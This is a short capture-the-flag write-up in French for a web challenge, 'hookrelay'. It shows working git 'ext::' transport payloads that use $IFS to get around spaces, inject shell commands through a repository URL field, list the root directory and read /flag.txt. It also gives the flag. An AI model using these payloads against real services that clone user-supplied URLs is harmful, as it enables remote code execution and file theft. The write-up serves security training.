# hookrelay (web, 350) — RÉSOLU

## Challenge
"Mirror healthcheck" du CI : `POST /check` avec `repo=<git url>` → l'agent fait un
`git clone --mirror` et **renvoie le stderr de git** dans la page. Flag dans un fichier
du FS que "no route serves".

## Exploit — git `ext::` transport RCE
`git clone` accepte le transport **`ext::`** : `ext::<cmd> <args>` exécute `<cmd>` et lui
parle le protocole git. La commande hérite de stderr → **affiché** dans la réponse.

- Les args ext:: sont séparés par des espaces ; pour mettre un espace DANS le script shell,
  utiliser `$IFS` : `repo=ext::sh -c <script_sans_espace>`.
- Recon : `repo=ext::sh -c ls$IFS-la$IFS/>&2` → révèle `/flag.txt` (31 o) à la racine.
- Lecture : `repo=ext::sh -c cat$IFS/flag.txt>&2` → le flag apparaît dans le stderr git.

(RCE confirmée d'abord avec `id` : `ext::sh -c id...` → `id: unknown user` = exécution.)
Source lisible aussi : `/app/app.py`, `/app/flag.py`.

## Flag
`NCTF{8a517ebc5be796877a2235d5}`
